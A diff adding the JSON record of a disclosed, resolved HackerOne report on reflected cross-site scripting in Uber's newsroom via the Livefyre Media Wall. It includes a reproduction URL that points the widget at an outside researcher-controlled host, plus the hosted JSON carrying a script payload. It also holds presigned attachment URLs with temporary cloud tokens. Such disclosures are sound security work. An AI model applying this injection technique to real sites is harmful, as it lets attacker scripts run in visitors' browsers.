@@ -1,0 +1,124 @@
+{
+  "id": 134061,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQwNjE=",
+  "url": "https://hackerone.com/reports/134061",
+  "title": "Reflected XSS via Livefyre Media Wall in newsroom.uber.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-23T16:36:59.846Z",
+  "submitted_at": "2016-04-23T16:36:59.846Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mdv",
+    "url": "/mdv",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 314,
+    "url": "https://hackerone.com/uber",
+    "handle": "uber",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Uber",
+      "twitter_handle": "",
+      "website": "https://www.uber.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-05-09T22:32:18.785Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-04-28T18:02:53.216Z",
+  "team_member_agreed_on_going_public_at": "2016-05-09T22:32:18.700Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello @uber,\nThis vulnerability works in all sites where there [Livefyre Media Wall](http://web.livefyre.com/apps/mediawall/ \"Livefyre Media Wall\"), including [newsroom.uber.com](https://newsroom.uber.com/ \"Uber News\").\nTo reproduce this Cross-Site Scripting, visit this URL: https://newsroom.uber.com/?lf-content=danylod.com/uber.php?:131560603:307477931\nVulnerable is this source code: https://cdn.livefyre.com/libs/streamhub-permalink/v0.4.1/streamhub-permalink.min.js\nParameter `lf-content` can be controlled to load JSON file as follows: \n```\nlf-content=controlled-domain:GET parameter 'collection_id':GET parameter 'content_id'\n```\nBrowser try to upload content from:\n```\nhttps://bootstrap.controlled-domain/api/v3.0/content/thread/?collection_id=GET+parameter+'collection_id'&content_id=GET+parameter+'content_id'&depth_only=false\n```\nSo, on https://bootstrap.danylod.com/uber.php i placed this JSON content:\n```\n{\n  \"status\": \"ok\",\n  \"code\": 200,\n  \"data\": {\n    \"content\": [\n      {\n        \"source\": 0,\n        \"collectionId\": \"131560603\",\n        \"content\": {\n          \"generator\": {\n            \"id\": \"livefyre.com\"\n          },\n          \"bodyHtml\": \"<marquee>XSS</marquee><script>alert(\\\"XSS on \\\"+ document.domain)</script>\",\n          \"annotations\": {\n            \"likedBy\": [\n              \"54c1e33eb841b37995000d5d@engadget.fyre.co\"\n            ]\n          },\n          \"authorId\": \"50782a81bc6bf341d3002b97@engadget.fyre.co\",\n          \"createdAt\": 1431144598,\n          \"parentId\": \"307291329\",\n          \"updatedAt\": 1431144598,\n          \"id\": \"307477931\",\n          \"ancestorId\": \"307291329\"\n        },\n        \"vis\": 1,\n        \"type\": 0,\n        \"event\": 1431269111210110\n      }\n    ],\n    \"meta\": {\n      \"page\": 0\n    },\n    \"authors\": {\n      \"50782a81bc6bf341d3002b97@engadget.fyre.co\": {\n        \"displayName\": \"MDV\",\n        \"tags\": [],\n        \"profileUrl\": \"https://hackerone.com/mdv\",\n        \"avatar\": \"https://bootstrap.danylod.com/mdv.png\",\n        \"type\": 1,\n        \"id\": \"50782a81bc6bf341d3002b97@engadget.fyre.co\"\n      }\n    }\n  }\n}\n```\nVia JSON parameter `bodyHtml` i can inject HTML code, see screenshot F89055\\.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 89055,
+      "file_name": "XSS2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/089/055/8a646292153eb0d2e3727d5c3a79746d884cd40e/XSS2.png?response-content-disposition=attachment%3B%20filename%3D%22XSS2.png%22%3B%20filename%2A%3DUTF-8%27%27XSS2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T120812Z&X-Amz-Expires=2597&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac3bb950e8b0c0ec0b09684232b8fed06760ab4647ffe67de38a04ae567b5b90",
+      "file_size": 1056834,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 89056,
+      "file_name": "XSS1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/089/056/0863b1cf595f21cb6dc1703fbf1c38cd5f6b392d/XSS1.png?response-content-disposition=attachment%3B%20filename%3D%22XSS1.png%22%3B%20filename%2A%3DUTF-8%27%27XSS1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T120812Z&X-Amz-Expires=2597&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b2656caff12f0336a3c660f126e6f3bcc9fea310ac14794ca4d0fb4b7e3b748c",
+      "file_size": 2473625,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-05-28T18:02:53.273Z",
+  "allow_singular_disclosure_after": -243367519.7030377,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "michiel",
+    "mdv",
+    "jens",
+    "dyabla",
+    "pei"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
